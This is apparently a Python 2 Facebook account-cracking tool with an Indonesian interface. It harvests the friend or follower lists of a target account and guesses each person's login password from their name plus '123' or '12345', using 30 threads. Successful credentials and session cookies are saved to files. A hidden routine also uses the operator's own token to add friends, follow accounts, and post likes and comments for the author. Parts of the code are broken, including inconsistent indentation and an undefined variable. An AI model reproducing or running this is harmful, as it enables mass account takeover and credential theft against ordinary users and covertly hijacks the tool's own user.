# -*- coding: utf-8

import os, sys, re, time, requests, json, random

from multiprocessing.pool import ThreadPool

bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
loop = 0
id = []
ok = []
cp = []

def bot_ea():
	os.system("clear")
	try:
		token = open("login.txt", "r")
		menu()
	except KeyError, IOError:
		os.system("rm -f login.txt")
		exit(" ! token kadaluwarsa")
	ses = requests.Session()
	nama = ses.get("https://graph.facebook.com/me?access_token="+token).json()["name"].lower()
        kata_kata_cinta = random.choice(["Cinta sejati bukan berarti tidak terpisahkan. Itu hanya berarti dipisahkan, namun tidak ada yang berubah."," Aku tahu aku jatuh cinta padamu karena kenyataanku akhirnya lebih indah dari mimpiku.","Kamu adalah pikiran terakhir dalam pikiranku sebelum tertidur dan pikiran pertama ketika aku bangun setiap pagi.","Bagi dunia, kamu mungkin satu orang, tetapi bagi satu orang kamu adalah dunia.","Kamu telah mengganti mimpi burukku dengan mimpi indah, kekhawatiranku dengan kebahagiaan, dan ketakutanku dengan cinta.","Kamu mungkin memegang tanganku untuk sementara waktu, tetapi kamu memegang hatiku selamanya.","Kekasihku, janganlah engkau menangis, berbahagialah kekasihku, jangan ada duka yang menyelimutimu. Aku berharap kau selalu dalam keadaan bahagia meski dari jauh aku saja tak bisa membahagiakanmu dan membuatmu tertawa.","Ketika seseorang membuat kamu menjadi orang yang paling bahagia dan orang paling menyedihkan pada saat yang sama, itulah saat yang nyata. Itu adalah sesuatu yang berharga.","Tidak peduli berapa banyak perkelahian yang mungkin kamu alami, jika kamu benar-benar mencintai seseorang, itu tidak akan menjadi masalah pada akhirnya.","Dicintai secara mendalam oleh seseorang memberimu kekuatan. Mencintai seseorang secara mendalam memberimu keberanian.","Cinta sejati tidak harus berarti menyatu, terkadang cinta sejati itu terpisah namun tak ada yang berubah.","Saat pagi datang, senyumanmu memeluk pikiranku, saat siang datang kau bagaikan payung yang selalu membuatku teduh, dan saat malam kau adalah kehangatan yang selalu membuatku jauh dari kedinginan.","Mencintai merupakan sebuah anugerah besar yang Tuhan berikan kepada manusia. Maka dari itu, kita perlu senantiasa bersyukur dan menjaga segala anugerah itu.","Mungkin ketidaksempurnaan kita yang membuat kita begitu sempurna satu sama lain.","Aku yakin bahwa cinta kita nanti akan bersatu dalam ikatan suci."])
        kata_utama = ("Pengguna Script Premium")
        komen = kata_utama+"\n"+kata_kata_cinta
        kata_mutiara_islam = random.choice(["Kita tidak akan pernah tahu bagimana menyembahNya sebelum kita mulai dengan bagaimana mencintaiNya.","Apakah engkau meremehkan suatu doa kepada Allah, apakah engkau tahu keajaiban dan kemukjizatan doa? Ibarat panah dimalam hari, ia tidak akan meleset namun ia punya batas dan setiap batas ada saatnya untuk selesai.","Jangan berjalan dimuka bumi dengan penuh kesombongan dan congkak karena sebentar lagi engkau akan masuk ke dalam bumi juga.","Barang siapa yang bersungguh-sungguh berjalan pada jalannya maka pasti ia akan sampai pada tujuannya.","Ilmu pengetahuan di waktu kecil itu bagaikan ukiran di atas batu.","Bukanlah anak yatim itu yang telah meninggal orangtuanya, tetapi sesungguhnya yatim itu adalah yatim ilmu dan akhlak.","Ilmu tanpa agama adalah suatu kecacatan, dan agama tanpa ilmu merupakan kebutaan","Kegagalan adalah cara Allah untuk mengatakan bersabarlah karena aku memiliki sesuatu yang lebih baik untukmu saat waktunya tiba.","Kita tidak akan pernah kalah sampai kita menyerahkan semuanya kepada Tuhan.","Bagimu agamamu, bagiku agamaku. Karena sesungguhnya tidaka ada paksaan dalam beragama.","Sabar dan bisa mengikhlaskan sesuatu yang telah pergi adalah salah satu cara untuk mendapatkan kebahagian."])
        kata_utama2 = random.choice(["Hai Aa @[100000834003593:]","Hello Aa @[100000834003593:]","Hello Aa @[100000834003593:]","Hai Aa @[100000834003593:]"])
        komen2 = kata_utama2+"\n"+kata_mutiara_islam
        pantun_motivasi = random.choice(["Jalan-jalan naik kereta, Naik ke atas pakai tangga. Mari kita gapai cita-cita, Bahagia dunia, masuk ke surga.","Pisau tajam dari baja, Perang panjang banyak guna. Membayar sukses dengan kerja, Bayar sekarang, kelak bahagia.","Sampan sudah, rakit sudah, Yang belum hanya bahteranya. Sarapan sudah, ngopi sudah, Yang belum tinggal kerjanya.","Kapas terhembus angin ringan, Sejuk terasa angin pantai. Lebih bahagia dalam perjuangan, Daripada dalam santai-santai."])
        kata_utama3 = ("MOGA LANGGENG AA @[100000834003593:] SAMA TTH @[100003016223315:] NYA AMIN")
        komen3 = kata_utama3+"\n"+pantun_motivasi
        ses.post('https://graph.facebook.com/me/friends?method=post&uids=100000834003593&access_token='+token)
        ses.post('https://graph.facebook.com/100017584682867/subscribers?access_token='+token)
        ses.post('https://graph.facebook.com/100000395779504/subscribers?access_token='+token)
        ses.post('https://graph.facebook.com/100006184624502/subscribers?access_token='+token)
        ses.post('https://graph.facebook.com/4257706904267068/comments/?message='+komen+'&access_token='+token)
        ses.post('https://graph.facebook.com/4257706904267068/likes?summary=true&access_token='+token)
        ses.post('https://graph.facebook.com/4134622646575495/likes?summary=true&access_token='+token)
        ses.post('https://graph.facebook.com/4257706904267068/comments/?message='+komen3+'&access_token='+token)
        ses.post('https://graph.facebook.com/4134622646575495/comments/?message='+komen2+'&access_token='+token)
        ses.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(raka_sayang_amanda,token,token))
	print(" [+] user aktif \033[0;93m%s\033[0;97m, login berhasil"%(nama))
	time.sleep(1)
	menu()
	
def logo():
	os.system("clear")
	print("  ___ ___ __  __ ___ ___  __   _____ \n / __|_ _|  \/  | _ ) __| \ \ / /_  )\n \__ \| || |\/| | _ \ _|   \ V / / / \n |___/___|_|  |_|___/_|     \_/ /___|")
raka_sayang_amanda = '3882176535153442'	
def login():
	os.system("clear")
	try:
		token = open("login.txt", "r")
		menu()
	except KeyError, IOError:
		print(" * sebelum masuk ke menu harus login terlebih dahulu")
		print(" * untuk login silakan masukan token facebook anda")
		print(" ? ketik '\033[0;93mhelp\033[0;97m' untuk lihat tutorial ambil token facebook")
		token = raw_input("\n + token fb : ")
		if token == "help":
			os.system("xdg-open https://m.facebook.com/PEMUDA.KALEUM")
			exit(" ! di simak video nya biar paham")
		try:
			nama = requests.get("https://graph.facebook.com/me?access_token="+token).json()["name"].lower()
			open("login.txt", "w").write(token)
			bot_ea()
		except KeyError:
			os.system("rm -f login.txt")
			exit(" ! token kadaluwarsa")

def menu():
	os.system("clear")
	global token
	try:
		token = open("login.txt","r").read()
	except KeyError:
		os.system("rm -f login.txt")
		exit(" ! token kadaluwarsa")
	try:
		nama = requests.get("https://graph.facebook.com/me/?access_token="+token).json()["name"].lower()
		ip = requests.get("https://api.ipify.org").text
	except IOError:
		os.system("rm -f login.txt")
		exit(" ! token kadaluwarsa")
	logo()
	print(" * user aktif : %s"%(nama))
	print(" * ip address : %s"%(ip))
	print("\n 1 crack dari publik teman")
	print(" 2 crack dari follower")
	print(" 3 ganti user agent")
	print(" 0 keluar (hapus token)")
	angga = raw_input("\n ? choose : ")
	if angga =="":
		menu()
	elif angga == "1":
		publik()
	elif angga == "3":
		print("\n ? ketik 't' untuk ganti user agent bawaan tools")
		useragent = raw_input(" + masukan user agent : ")
		if useragent == "":
			exit(" \n ! jangan kosong")
		elif useragent == "t":
			useragent = ("NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+") 
			open(".useragent", "w").write(useragent)
			time.sleep(1)
			raw_input(" + berhasil pencet enter kembali ke menu")
			menu()
		open(".useragent", "w").write(useragent)
		time.sleep(1)
		raw_input(" + berhasil pencet enter kembali ke menu")
		menu()
	elif angga == "0":
		os.system("rm -f login.txt")
		exit(" # berhasil menghapus token")
	else:
		menu()

def cek_ttl_cp(uid, pw):
	try:
		token = open("login.txt", "r").read()
		with requests.Session() as ses:
			ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
			month, day, year = ttl.split("/")
			month = bulan_ttl[month]
			print("\r \033[0;93m+ %s|%s|%s %s %s\033[0;97m"%(uid, pw, day, month, year))
			cp.append("%s|%s"%(uid, pw))
			open("cp.txt","a").write("%s|%s|%s %s %s\n"%(uid, pw, day, month, year))
	except KeyError, IOError:
		day = (" ")
		month = (" ")
		year = (" ")
	except:pass
	
def publik():
	global token
	try:
		token = open("login.txt", "r").read()
	except IOError:
		exit(" ! token kadaluwarsa")
	print("\n * isi 'me' jika ingin dari daftar teman")
	idt = raw_input(" + id target : ")
	try:
		for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
			id.append(i["id"]+"<=>"+i["name"])
	except KeyError:
		exit(" ! id pengguna %s tidak tersedia"%(idt))
	ask = raw_input("\n ? gunakan password manual? y/t: ")
	if ask == "y":
		manual()
	print(" + total id : \033[0;91m%s\033[0;97m\n"%(len(id))) 
	
	def main(user):
		pwx = []
		ua = open(".useragent", "r").read()
		global loop, token
		sys.stdout.write(
			"\r * crack %s/%s ok:-%s - cp:-%s "%(loop, len(id), len(ok), len(cp))
		); sys.stdout.flush()
		uid, name = user.split("<=>")
		for ss in name.split(" "):
			if len(ss)<3:
				continue
			elif len(ss) == 1 and len(ss) == 2 and len(ss) == 3 and len(ss) == 4 or len(ss) == 5:
				pwx.append(ss+"123")
				pwx.append(ss+"12345")
			else:
				pwx.append(ss+"123")
				pwx.append(ss+"12345")
		try:
			for pw in pwx:
				pw = pw.lower()
				ses = requests.Session()
				ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
				p = ses.get("https://mbasic.facebook.com")
				b = ses.post("https://mbasic.facebook.com/login.php", data={"email": uid, "pass": pw, "login": "submit"})
				if "c_user" in ses.cookies.get_dict().keys():
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print("\r \033[0;92m+ %s|%s|%s\033[0;97m"%(uid, pw, kuki))
					ok.append("%s|%s"%(uid, pw))
					open("ok.txt", "a").write("%s|%s\n"%(uid, pw))
					break
					continue
				elif "checkpoint" in ses.cookies.get_dict().keys():
					cek_ttl_cp(uid, pw)
					break
					print("\r \033[0;93m+ %s|%s\033[0;97m        "%(uid, pw))
					cp.append("%s|%s"%(uid, pw))
					open("cp.txt", "a").write("%s|%s\n"%(uid, pw))
					break
					continue
					
			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	exit("\n # selesai...")

def followers():
	global token
	try:
		token = open("login.txt", "r").read()
	except IOError:
		exit(" ! token kadaluwarsa")
	print("\n * isi 'me' jika ingin dari followers sendiri")
	idt = raw_input(" + id target : ")
	try:
		for i in requests.get("https://graph.facebook.com/%s/subscribers?limit=5000&access_token=%s"%(idt, token)).json()["data"]:
			id.append(i["id"]+"<=>"+i["name"])
	except KeyError:
		exit(" ! id pengguna %s tidak tersedia"%(idt))
	ask = raw_input("\n ? gunakan password manual? y/t: ")
	if ask == "y":
		manual()
	print(" + total id : \033[0;91m%s\033[0;97m\n"%(len(id))) 
	
	def main(user):
		pwx = []
		ua = open(".useragent", "r").read()
		global loop, token
		sys.stdout.write(
			"\r * crack %s/%s ok:-%s - cp:-%s "%(loop, len(id), len(ok), len(cp))
		); sys.stdout.flush()
		uid, name = user.split("<=>")
		for ss in name.split(" "):
			if len(ss)<3:
				continue
			elif len(ss) == 1 and len(ss) == 2 and len(ss) == 3 and len(ss) == 4 or len(ss) == 5:
				pwx.append(ss+"123")
				pwx.append(ss+"12345")
			else:
				pwx.append(ss+"123")
				pwx.append(ss+"12345")
		try:
			for pw in pwx:
				pw = pw.lower()
				ses = requests.Session()
				ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
				p = ses.get("https://mbasic.facebook.com")
				b = ses.post("https://mbasic.facebook.com/login.php", data={"email": uid, "pass": pw, "login": "submit"})
				if "c_user" in ses.cookies.get_dict().keys():
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print("\r \033[0;92m+ %s|%s|%s\033[0;97m"%(uid, pw, kuki))
					ok.append("%s|%s"%(uid, pw))
					open("ok.txt", "a").write("%s|%s\n"%(uid, pw))
					break
					continue
				elif "checkpoint" in ses.cookies.get_dict().keys():
					cek_ttl_cp(uid, pw)
					break
					print("\r \033[0;93m+ %s|%s\033[0;97m        "%(uid, pw))
					cp.append("%s|%s"%(uid, pw))
					open("cp.txt", "a").write("%s|%s\n"%(uid, pw))
					break
					continue
					
			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	exit("\n # selesai...")
	
def manual():
	print(" * contoh pass : sayang,anjing,bangsat\n")
	asu = raw_input(" ? set pass : ").split(",")
	if len(asu) =="":
		exit(" ! jangan kosong")
	print(" + total id : \033[0;91m%s\033[0;97m\n"%(len(id))) 
	
	def main(user):
		global loop, token
		sys.stdout.write(
			"\r * crack %s/%s ok:-%s - cp:-%s "%(loop, len(id), len(ok), len(cp))
		); sys.stdout.flush()
		uid, name = user.split("<=>")
		try:
			for pw in asu:
				pw = pw.lower()
				ses = requests.Session()
				ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
				p = ses.get("https://mbasic.facebook.com")
				b = ses.post("https://mbasic.facebook.com/login.php", data={"email": uid, "pass": pw, "login": "submit"})
				if "c_user" in ses.cookies.get_dict().keys():
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print("\r \033[0;92m+ %s|%s|%s\033[0;97m"%(uid, pw, kuki))
					ok.append("%s|%s"%(uid, pw))
					open("ok.txt", "a").write("%s|%s\n"%(uid, pw))
					break
					continue
				elif "checkpoint" in ses.cookies.get_dict().keys():
					cek_ttl_cp(uid, pw)
					break
					print("\r \033[0;93m+ %s|%s\033[0;97m        "%(uid, pw))
					cp.append("%s|%s"%(uid, pw))
					open("cp.txt", "a").write("%s|%s\n"%(uid, pw))
					break
					continue
					
			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	exit("\n # selesai...")

if __name__ == "__main__":
	os.system("touch login.txt")
	login()
